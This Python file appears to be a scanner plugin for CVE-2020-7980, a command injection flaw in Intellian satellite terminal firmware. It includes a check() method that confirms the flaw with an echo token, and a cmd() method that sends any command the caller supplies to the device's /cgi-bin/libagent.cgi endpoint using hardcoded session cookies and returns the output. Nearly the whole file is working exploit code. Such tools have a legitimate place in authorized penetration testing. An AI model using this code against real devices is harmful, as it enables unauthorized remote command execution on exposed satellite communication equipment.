#!/usr/bin/env python3

import time
import calendar
from app.lib.utils.request import request
from app.lib.utils.common import get_capta, get_useragent

class CVE_2020_7980_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2020-7980漏洞',
            'description': 'CVE-2020-7980漏洞可执行任意命令,影响范围为: Intellian v1.12, v1.21, v1.24',
            'date': '2020-01-25',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }
        self.capta = get_capta()
        self.data = {
            "O_": "A",
            "V_": 1,
            "S_": 123456789,
            "F_": "EXEC_CMD",
            "P1_":
                {
                    "F":"EXEC_CMD",
                    "Q": ""
                }
        }

    def check(self):
    
        """
        
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        try:
            self.data['P1_']['Q'] = 'echo %s' % (self.capta)
            cmd_request = request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
            if cmd_request.status_code == 200 and self.capta in cmd_request.text:
                return True
            else:
                print("不存在CVE-2020-7980漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass
    
    def cmd(self, cmd):
    
        """
        执行命令

        :param str cmd: 要执行的命令

        :return tuple result: 执行的结果
        """

        try:
            if self.check():
                self.data['P1_']['Q'] = cmd
                cmd_request = request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
                result = cmd_request.text.split()[-2].replace('},', '')
                return True, result
            else:
                return False, '不存在CVE-2020-7980漏洞!'
        except Exception as e:
            print(e)
            return False, e
        finally:
            pass

if __name__ == '__main__':
    CVE_2020_7980 = CVE_2020_7980_BaseVerify('http://127.0.0.1')
    CVE_2020_7980.check()